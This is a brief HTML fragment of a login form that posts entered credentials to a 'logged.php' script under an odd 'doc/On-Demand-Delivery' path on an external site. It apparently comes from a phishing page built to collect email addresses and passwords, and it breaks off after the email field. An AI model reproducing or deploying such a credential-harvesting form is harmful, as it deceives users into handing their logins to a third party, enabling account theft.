...
<form id="loginForm" name="loginForm" method="post" action="https://agronal.com/doc/On-Demand-Delivery/On-Demand-Delivery/logged.php">

        <div class="row login-input-group">
          
          <div class="col-xs-24 mb-15">
		  
		  <input placeholder="Email Address" type="email" name="drift" tabindex="1" style="background-color: rgba(255, 255, 255, 0.55); border: 1px solid rgba(255, 255, 255, 0.55); box-shadow: 0 3px 4px 0 rgba(0, 0, 0, 0.16);" id="email" readonly=""  required="" >
